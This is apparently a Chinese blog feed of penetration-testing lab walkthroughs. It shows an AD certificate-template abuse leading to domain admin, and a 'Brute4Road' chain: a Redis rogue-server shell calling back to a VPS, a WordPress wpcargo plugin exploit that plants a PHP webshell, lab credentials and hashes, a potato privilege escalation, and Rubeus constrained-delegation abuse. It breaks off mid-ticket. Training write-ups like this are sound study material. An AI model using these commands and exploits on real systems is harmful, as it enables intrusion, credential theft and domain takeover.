class="string">emhhbmd4aWEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4V4dQ6KYB</span></span><br><span class="line"><span class="string">d1ch5fRBhmMW/cxGS88s4MDhArFnd8paIld+dZHDqFML79ExZN0ZZHtH3vJtqBCM</span></span><br><span class="line"><span class="string">oLE47kg+6rGH5dfaz9pR8BlV3T78dcPnzr64rRT5bbDubCt9VjDZ2Nrb6LxulHoD</span></span><br><span class="line"><span class="string">9BE4PcHpL1FrS64/TgimJ+YMi7YyjDpij2XBPsOggyqIo4+hJlDZObk/862t9YPJ</span></span><br><span class="line"><span class="string">T6p7zHoe3ii9XZv1L6eetSbqQ+Si28cvjrlHjq27Gku1nFX4T/ML/yne9Teqydog</span></span><br><span class="line"><span class="string">FFz+HXQs5QUI+KI029J3S0laWTt/opa3aVeYlKVdaP/wLmfWv5HwquA3RxxifyZU</span></span><br><span class="line"><span class="string">sbmGWNnV+AXfAgMBAAGjggMPMIIDCzA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3</span></span><br><span class="line"><span class="string">FQiB3dAhhYHGIoPFkTqEjedRg9jIBiuBkpQlhInfBwIBZAIBBTApBgNVHSUEIjAg</span></span><br><span class="line"><span class="string">BgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWg</span></span><br><span class="line"><span class="string">MDUGCSsGAQQBgjcVCgQoMCYwDAYKKwYBBAGCNwoDBDAKBggrBgEFBQcDBDAKBggr</span></span><br><span class="line"><span class="string">BgEFBQcDAjBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG</span></span><br><span class="line"><span class="string">9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM1ln9QLzaKk</span></span><br><span class="line"><span class="string">KLs2gDx/+Tw9tmqFMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlz</span></span><br><span class="line"><span class="string">dHJhdG9yMB8GA1UdIwQYMBaAFFe6Z2kqz4ktl3hku7D+cH+iSYCiMIHaBgNVHR8E</span></span><br><span class="line"><span class="string">gdIwgc8wgcyggcmggcaGgcNsZGFwOi8vL0NOPXhpYW9yYW5nLVhJQU9SQU5HLURD</span></span><br><span class="line"><span class="string">LUNBLENOPVhJQU9SQU5HLURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2</span></span><br><span class="line"><span class="string">aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXhpYW9yYW5nLERD</span></span><br><span class="line"><span class="string">PWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9</span></span><br><span class="line"><span class="string">Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcoGCCsGAQUFBwEBBIG9MIG6MIG3BggrBgEF</span></span><br><span class="line"><span class="string">BQcwAoaBqmxkYXA6Ly8vQ049eGlhb3JhbmctWElBT1JBTkctREMtQ0EsQ049QUlB</span></span><br><span class="line"><span class="string">LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp</span></span><br><span class="line"><span class="string">Z3VyYXRpb24sREM9eGlhb3JhbmcsREM9bGFiP2NBQ2VydGlmaWNhdGU/YmFzZT9v</span></span><br><span class="line"><span class="string">YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUA</span></span><br><span class="line"><span class="string">A4IBAQADETRmjot+K43S5/SfkTCozzcSqu/RqT8Z/UBP1OTz9GPVLXp+bE665ZEf</span></span><br><span class="line"><span class="string">8FRLoOOiQmCFuldH3eL379LpogpT71Ebo6hwjrlnP/LpL5b3m/spqxSW2CgE+BMe</span></span><br><span class="line"><span class="string">ddL3DJAC2P5P18bGkDVrUp0yYYmsPc+2eeuVGcROcaSBe/WCopddYP8iQkVlR53Q</span></span><br><span class="line"><span class="string">IyAatff+yMd7P6TjYLH2yXylLGZ3Z66Dy53c0wEZLC5IXOiY5MfhgJCHgEd4xQgQ</span></span><br><span class="line"><span class="string">DhE8XcCRFldRWeUaUTe3VHaC5HnhJA+/3ZmruLdEPjxHZCFAombzoCuxLqsvEvwc</span></span><br><span class="line"><span class="string">2liMB3A/cbWoZItBw59Sbfll6MY+</span></span><br><span class="line"><span class="string">-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br></pre></td></tr></table></figure><p>å°†<code>-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----</code>å¤åˆ¶ä¿å­˜ä¸º<code>cert.pem</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="keyword">in</span> cert.pem -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx</span><br></pre></td></tr></table></figure><p>å°†cert.pemè½¬æ¢ä¸ºcert.pfxï¼Œä¸éœ€è¦è¾“å…¥å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /dc:172.22.9.7 /ptt</span><br></pre></td></tr></table></figure><p>å¯„ï¼Œå¤±è´¥äº†ï¼Œæ¢ä¸€ç§æ–¹å¼ç»§ç»­ç”³è¯·</p><p>æŸ¥è¯¢å­˜åœ¨å“ªäº›è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy find -u <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span>  -password <span class="string">&#x27;MyPass2@@6&#x27;</span> -dc-ip 172.22.9.7 -vulnerable -stdout 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>ç»§ç»­ç”³è¯·è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy req -u <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> -p <span class="string">&#x27;MyPass2@@6&#x27;</span> -target 172.22.9.7 -dc-ip 172.22.9.7 -ca <span class="string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="string">&#x27;XR Manager&#x27;</span>  -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p>å¾—åˆ°administrator.pfxï¼Œä½¿ç”¨è·å¾—çš„è¯ä¹¦è·å–åŸŸç®¡å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure><p>PTHè·å–åŸŸæ§æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atype c:\users\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Brute4Road</title>
    <link href="https://bowuchuling.github.io/posts/chunqiuBrute4Road.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiuBrute4Road.html</id>
    <published>2024-08-20T15:14:33.336Z</published>
    <updated>2024-08-20T15:34:49.971Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Brute4Road</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">39.99.146.22:21 open</span><br><span class="line">39.99.146.22:6379 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp 39.99.146.22:21:anonymous</span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[+] Redis 39.99.146.22:6379 unauthorized file:/usr/local/redis/db/dump.rdb</span><br></pre></td></tr></table></figure><p>æ‰«çš„ä¸å…¨ï¼Œä½†æ˜¯ä¸»è¦çš„æ‰«å‡ºæ¥å°±è¡Œäº†ï¼Œredisçš„æœªæˆæƒè®¿é—®ï¼Œåˆ©ç”¨å·²çŸ¥è„šæœ¬å¯ä»¥ç›´æ¥æ‹¿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost ç›®æ ‡ip --lhost vpsip</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨CSä¸Šçº¿åšæŒä¹…åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure><p>suidæƒé™ï¼Œä½¿ç”¨base64è¯»å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&#x27;/home/redis/flag/flag01&#x27;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«å†…ç½‘ï¼Œæ­ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.2.7  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe04:2374  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:04:23:74  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 125541  bytes 165100176 (157.4 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 67835  bytes 17702141 (16.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.2.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] NetBios: 172.22.2.34     XIAORANG\CLIENT01              </span><br><span class="line">[*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02         </span><br><span class="line">[*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] ftp://172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.2.18        code:200 len:57738  title:åˆä¸€ä¸ªWordPressç«™ç‚¹</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ªwordpressç«™ç‚¹ï¼Œwpscanå…ˆæ‰«ä¸€æ³¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820192138530.png" alt="image-20240820192138530"></p><p>åˆ©ç”¨æ’ä»¶æ¼æ´ä¸Šä¼ shellï¼Œæ‹¿åˆ°18çš„shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line"></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line"></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line"></span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240820192358985.png" alt="image-20240820192358985"></p><p>åœ¨wp-config.phpä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpuser/WpuserEha8Fgj9</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820192546293.png" alt="image-20240820192546293"></p><p>è¿æ¥æˆåŠŸåå¯ä»¥æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><h2 id="flag03">flag03</h2><p>åœ¨æ•°æ®åº“ä¸­çš„somethingå¯ä»¥å‘ç°ä¸€äº›å¯†ç ï¼Œåˆ©ç”¨çˆ†ç ´å·¥å…·å°è¯•çˆ†ç ´16çš„MSSQLSERVERçš„å¯†ç ï¼Œè¿™é‡Œæ³¨æ„å¯†ç å‰é¢æœ‰ç©ºæ ¼ï¼Œéœ€è¦å»æ‰</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820193024753.png" alt="image-20240820193024753"></p><p>è¿™é‡Œçˆ†ç ´å‡ºäº†ä¸€ä¸ªå¯†ç ï¼Œè¿™é‡Œçš„saçš„sqlserverçš„é»˜è®¤å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.16</span><br><span class="line">sa/ElGNkOiC</span><br></pre></td></tr></table></figure><p>ç»§ç»­ä¸ŠMDUTç»“åˆåœŸè±†ææƒæ‹¿æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/sweetpotato.exe -a <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820193253034.png" alt="image-20240820193253034"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">C</span>:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p>åšä¸€ä¸‹æƒé™ç»´æŒï¼Œä¸Šbloodhoundåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820194545079.png" alt="image-20240820194545079"></p><p>å‘ç°è¿™é‡Œæœ‰çº¦æŸæ€§å§”æ´¾ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡MSSQLç›´æ¥æ‰“DCï¼Œå…ˆæŠ“ä¸€ä¸‹æœºå™¨è´¦æˆ·çš„å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* Username : MSSQLSERVER$</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : d34af3aa004fa2c45e4ea2b59dde8fbc</span><br><span class="line">* SHA1     : 709101e5535f4c2e0ca6110a14e0808823d456c4</span><br></pre></td></tr></table></figure><p>ç”³è¯·TGTï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰ååº”å¯èƒ½æ˜¯netç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ¢ä¸ªç‰ˆæœ¬å°±å¥½äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d34af3aa004fa2c45e4ea2b59dde8fbc /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; 1.txt</span><br></pre></td></tr></table></figure><p>ä¼šå¾—åˆ°base64ç¼–ç çš„TGTç¥¨æ®ï¼Œåˆ©ç”¨Rubeuså¯¼å…¥ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2+JPpiQWUoycaAOhzt/cLi5VNZB3R8q2w/HLTT9EYl6QdDtUsfWSHjiRigaaUsKwim5ja35sfxACBN+tRXIcfnd+bj56os0h3hRrLa6UuDcdwCkdzgvG3CC1v325hkcwgP/r1XQgFfFh2htmhIYCyHwOuucjsmTCZYxof2WklddBmGeITjGFSbcKTtWLLDtds4SUC+aSf4XLG7Z7z5ALA9Sn5lhQV77iaaz66wyb+bZbu3CRNE3hFX/garqf84kiUH/xNlpCf/pYHNGMsw7h7475q4txGiiB/izgjVANaatIe1bCdQbdzfqKKp8MM/YckOCy3q3o1WiE3ERcNCvA1uoeCTbPJVYl8YwUjTrZ5eBgmIfeXtpKa6gGW0YCnoncYK759iDdCEEEBRXKzyZ1M66zIt3/4ulINHgwlfokKp6mEcVXStRH3WA3nC7q+ZWJfZt590dXrBj+jjvGf8SbNj4QldPE5ny6jOLIsO021nGp/6rDvLWjxrq/5U3mb2feI1lass33bnDscxGpf90uB7HovWSl6Tb3P3+hOLwTm7UFWq7LAb81qee7Szr+sBqsBlV5LxlAufVFflW1fosdm8BWE6DRUxvUfIqOGzq/A20ho2ji8QncD1pThrn5JW4mgBfeCYxzoSbIdAv91Cj2PPiEMod8/NoTRA6/Ak29dy2oBVg8Xz7oJRrkNuoX6cIuPzqTdMAa9HQtdaAJVQApoWZBMBlw2RLB7Fbj6viWh3HE1NuN1DRMEaS1BZAJssNSi0kIDs3dnz74kCNmGPifVicAq609KQ1LnFXSzako/jronPqX9c7xubgz3REEm2ZI/9MW4Fi3APmnCtnTp1JkfRoB1nmZzLskiiJqFELBwR8oinohYYzzxkrnjzgiT3Py1rFO4eJl8cYmZCqksPN9EOLI5TEFBIYVrFo04mVVhU0LwRj26iM+z2t/K2Jws+zSIHxIfug5pCSO64M73DnjsieMfb7Cg+fwUvX9u8xVqr+3lKfdXPQb9me287ASnBvRZUnWYOXCUeDrtomy6bZ6ggzu26w1hWWorifQ/ZyTJRTnKcTUCYvmnFXOid0n5YxW/zhrmS9EI3okvw43niRxxWz9B4fc2dr6IYk+ayazynK7jm2rRK0b0H1B1qeMdiB6mfvsvXS5k1ud72stVdHdXDzztjuzQsickbRtMauHu03ciOfIs3othGVUL8FXuZEV1M9c9eMOIHvELm27EDovcxGCz4sCreYOeHcUyBIeO+5nP3ZLzxzUZZHGZDQb8BglRxiO8fg0gbu0eIU5d8aYGF8vipfVYeR7Pk/udiDwpl5GyQkZRuO9d1eHUB9NMNWk3l3nw8s/z7PVmxq/ywZ+/bFg4LUyl8JFBLye1B+nCkp0w0aBtMtWhXGe1oggdS564mK0cljgWPkUtVIc8zB/aDTyslI